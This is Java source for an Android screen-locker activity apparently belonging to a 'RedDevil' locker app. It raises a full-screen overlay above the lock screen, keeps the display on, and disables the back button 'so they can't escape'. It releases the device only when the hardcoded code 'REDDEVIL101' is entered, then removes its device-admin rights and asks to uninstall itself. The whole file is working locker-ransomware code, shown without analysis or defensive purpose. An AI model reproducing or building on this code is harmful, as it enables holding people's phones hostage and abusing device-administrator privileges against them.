package com.reddevil.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

public class LockActivity extends Activity {
    private static final String UNLOCK_CODE = "REDDEVIL101";

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.overlay_lock);

        if (Build.VERSION.SDK_INT >= 27) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        } else {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        final EditText input = findViewById(R.id.unlockInput);
        Button btn = findViewById(R.id.unlockBtn);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                String entered = input.getText().toString().trim().toUpperCase();
                if (entered.equals(UNLOCK_CODE)) {
                    try {
                        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        dpm.removeActiveAdmin(new ComponentName(LockActivity.this, AdminReceiver.class));
                    } catch (Exception e) {}

                    try {
                        Intent intent = new Intent(Intent.ACTION_DELETE);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    } catch (Exception e) {}
                    
                    finish();
                } else {
                    input.setError("Invalid code");
                }
            }
        });
    }

    @Override public void onBackPressed() {
        // Block the back button so they can't escape
    }
}
